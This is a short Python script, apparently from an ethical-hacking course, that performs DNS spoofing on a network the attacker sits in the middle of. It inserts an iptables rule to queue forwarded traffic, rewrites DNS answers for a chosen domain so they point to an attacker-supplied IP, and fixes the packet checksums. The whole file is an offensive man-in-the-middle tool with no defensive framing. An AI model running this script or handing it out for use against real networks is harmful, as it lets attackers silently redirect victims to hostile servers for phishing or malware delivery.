#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL to Intercept.")
    parser.add_argument("-i", "--ip", dest="rdata", help="IP to redirect your target to.")
    options = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify a URL to intercept and redirect.")
    if not options.rdata:
        parser.error("[-] Please specify an IP to redirect your target to.")
    return options


options = get_arguments()
url = options.url
ip = options.rdata


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if url in qname:
            print("[+] Spoofing Target's DNS: http://" + qname.decode("UTF-8") + " and redirecting them to " + ip)
            answer = scapy.DNSRR(rrname=qname, rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


try:
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C \n")
    subprocess.call(["iptables", "--flush"])

